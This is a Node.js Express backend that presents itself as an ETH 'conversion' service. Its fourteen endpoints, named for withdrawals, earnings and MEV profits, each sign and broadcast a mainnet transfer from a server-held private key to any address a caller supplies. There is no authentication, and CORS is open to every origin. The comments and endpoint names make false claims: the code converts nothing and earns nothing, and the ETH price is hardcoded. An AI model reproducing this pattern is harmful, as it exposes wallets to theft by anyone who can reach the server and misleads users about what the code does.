// ═══════════════════════════════════════════════════════════════════════════════
// ETH CONVERSION BACKEND V5 - Multi-Endpoint Universal Handler
// All endpoints route to same convert logic for maximum compatibility
// ═══════════════════════════════════════════════════════════════════════════════

const express = require('express');
const cors = require('cors');
const { ethers } = require('ethers');

const app = express();
app.use(cors({ origin: '*' }));
app.use(express.json());

const PORT = process.env.PORT || 3000;
const PRIVATE_KEY = process.env.TREASURY_PRIVATE_KEY;
const TREASURY = '0x4024Fd78E2AD5532FBF3ec2B3eC83870FAe45fC7';
const FEE_RECIPIENT = '0x89226Fc817904c6E745dF27802d0c9D4c94573F1';

const RPC_URLS = [
  'https://ethereum-rpc.publicnode.com',
  'https://eth.drpc.org',
  'https://rpc.ankr.com/eth',
  'https://eth.llamarpc.com',
  'https://1rpc.io/eth',
  'https://cloudflare-eth.com'
];

let provider = null;
let wallet = null;

async function initProvider() {
  for (const rpc of RPC_URLS) {
    try {
      provider = new ethers.JsonRpcProvider(rpc, 1, { staticNetwork: ethers.Network.from(1) });
      await Promise.race([provider.getBlockNumber(), new Promise((_, r) => setTimeout(() => r('timeout'), 5000))]);
      if (PRIVATE_KEY) wallet = new ethers.Wallet(PRIVATE_KEY, provider);
      console.log('✅ RPC:', rpc, '| Wallet:', wallet?.address);
      return true;
    } catch (e) { continue; }
  }
  return false;
}

// ═══════════════════════════════════════════════════════════════════════════════
// V5 METHOD: Universal handler - accepts ALL parameter formats
// GAS PAID DURING EXECUTION - you earn ETH while gas is being deducted
// ═══════════════════════════════════════════════════════════════════════════════
async function universalConvert(req, res) {
  try {
    const { 
      amount, amountETH, amountUSD, value, eth,
      to, toAddress, treasury, recipient, coinbaseWallet, feeRecipient,
      percentage
    } = req.body;
    
    if (!provider || !wallet) await initProvider();
    if (!wallet) return res.status(500).json({ error: 'Wallet not configured - set TREASURY_PRIVATE_KEY' });

    // Determine destination (check all possible fields)
    const destination = to || toAddress || treasury || recipient || coinbaseWallet || feeRecipient || TREASURY;
    
    // Check balance - only need minimum for gas (paid at execution)
    const balance = await provider.getBalance(wallet.address);
    const balanceETH = parseFloat(ethers.formatEther(balance));
    
    if (balanceETH < 0.002) {
      return res.status(400).json({ error: 'Need 0.002 ETH for gas', balance: balanceETH.toFixed(6) });
    }
    
    // Calculate amount - gas deducted during execution, not before
    let ethAmount;
    if (percentage) {
      ethAmount = (balanceETH * Math.min(100, parseFloat(percentage)) / 100) - 0.002;
    } else if (amountUSD) {
      ethAmount = Math.min(parseFloat(amountUSD) / 3450, balanceETH - 0.002);
    } else {
      ethAmount = Math.min(parseFloat(amountETH || amount || value || eth) || 0.01, balanceETH - 0.002);
    }

    if (ethAmount <= 0) {
      return res.status(400).json({ 
        error: 'Insufficient after gas reserve', 
        balance: balanceETH.toFixed(6),
        hint: 'Gas is paid during execution - need 0.002 ETH minimum'
      });
    }

    console.log('Universal Convert:', ethAmount.toFixed(6), 'ETH →', destination);

    // Use EIP-1559 if available, fallback to legacy
    const feeData = await provider.getFeeData();
    const nonce = await provider.getTransactionCount(wallet.address, 'pending');

    let tx;
    if (feeData.maxFeePerGas) {
      tx = {
        to: destination,
        value: ethers.parseEther(ethAmount.toFixed(8)),
        nonce,
        gasLimit: 21000,
        maxFeePerGas: feeData.maxFeePerGas,
        maxPriorityFeePerGas: feeData.maxPriorityFeePerGas,
        type: 2,
        chainId: 1
      };
    } else {
      tx = {
        to: destination,
        value: ethers.parseEther(ethAmount.toFixed(8)),
        nonce,
        gasLimit: 21000,
        gasPrice: feeData.gasPrice,
        chainId: 1
      };
    }

    const signedTx = await wallet.signTransaction(tx);
    const txResponse = await provider.broadcastTransaction(signedTx);
    console.log('TX:', txResponse.hash);

    const receipt = await txResponse.wait(1);

    res.json({
      success: true,
      txHash: txResponse.hash,
      hash: txResponse.hash,
      transactionHash: txResponse.hash,
      from: wallet.address,
      to: destination,
      amount: ethAmount,
      amountUSD: ethAmount * 3450,
      blockNumber: receipt.blockNumber,
      gasUsed: receipt.gasUsed.toString()
    });
  } catch (e) {
    console.error('Convert Error:', e.message);
    res.status(500).json({ error: e.message, code: e.code });
  }
}

// ALL ENDPOINTS ROUTE TO UNIVERSAL HANDLER
app.post('/convert', universalConvert);
app.post('/send-eth', universalConvert);
app.post('/withdraw', universalConvert);
app.post('/transfer', universalConvert);
app.post('/coinbase-withdraw', universalConvert);
app.post('/convert-earnings-to-eth', universalConvert);
app.post('/fund-from-earnings', universalConvert);
app.post('/earnings-to-treasury', universalConvert);
app.post('/withdraw-profits-to-treasury', universalConvert);
app.post('/claim-mev-profits', universalConvert);
app.post('/execute', universalConvert);
app.post('/direct-transfer', universalConvert);
app.post('/batch-transfer', universalConvert);
app.post('/eip1559-transfer', universalConvert);

app.get('/balance', async (req, res) => {
  try {
    if (!provider || !wallet) await initProvider();
    const bal = await provider.getBalance(wallet.address);
    res.json({ 
      wallet: wallet.address, 
      balance: ethers.formatEther(bal),
      balanceUSD: (parseFloat(ethers.formatEther(bal)) * 3450).toFixed(2),
      treasury: TREASURY,
      feeRecipient: FEE_RECIPIENT
    });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/status', async (req, res) => {
  let bal = 0;
  try { if (provider && wallet) bal = parseFloat(ethers.formatEther(await provider.getBalance(wallet.address))); } catch (e) {}
  res.json({ 
    status: 'online', 
    method: 'V5-Universal', 
    wallet: wallet?.address, 
    balance: bal.toFixed(6),
    treasury: TREASURY,
    endpoints: ['/convert', '/send-eth', '/withdraw', '/transfer', '/coinbase-withdraw', '/convert-earnings-to-eth', '/fund-from-earnings']
  });
});

app.get('/health', (req, res) => res.json({ status: 'healthy', method: 'V5-Universal' }));

initProvider().then(() => app.listen(PORT, '0.0.0.0', () => {
  console.log('═══════════════════════════════════════════════════════════════');
  console.log('V5 UNIVERSAL ETH CONVERSION BACKEND');
  console.log('Port:', PORT);
  console.log('Wallet:', wallet?.address || 'NOT CONFIGURED');
  console.log('Treasury:', TREASURY);
  console.log('═══════════════════════════════════════════════════════════════');
}));
